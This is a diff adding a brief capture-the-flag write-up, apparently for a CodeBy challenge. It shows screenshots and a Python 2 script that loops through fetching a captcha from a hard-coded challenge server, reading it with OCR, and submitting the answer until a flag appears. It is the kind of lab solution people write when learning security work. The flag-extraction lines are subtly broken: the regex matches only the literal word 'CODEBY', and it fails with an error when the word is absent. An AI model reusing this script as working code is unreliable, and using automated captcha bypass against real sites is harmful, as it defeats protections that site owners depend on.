@@ -1,0 +1,24 @@
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/d159f4ee-23a3-4b42-8342-d9ec67d040bd)
+
+```
+import os, requests, commands, re
+
+s = requests.session()
+url = "http://62.173.140.174:16036/"
+s.get(url + "image.php")
+while True:
+	open('captcha.png', 'wb').write( s.get(url + "image.php").content )
+	os.system('convert captcha.png -compress none -threshold 16% img.png')
+	captcha = commands.getoutput("gocr -i img.png").strip()
+	print captcha
+	response = s.post(url + "image.php", {'answer' : captcha}).text
+	print response
+	flag = re.findall('CODEBY', response)[0].rstrip()
+	if not str(flag).isdigit():
+		print "[+] Flag: %s" %flag
+		break
+	print "[%s] Sending Captcha=%s ... "%(flag, captcha)
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/db2ad7f7-907d-46e0-a020-b12d095f9775)
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/5f0f7ceb-c9c1-41f9-88b3-945174cf638a)
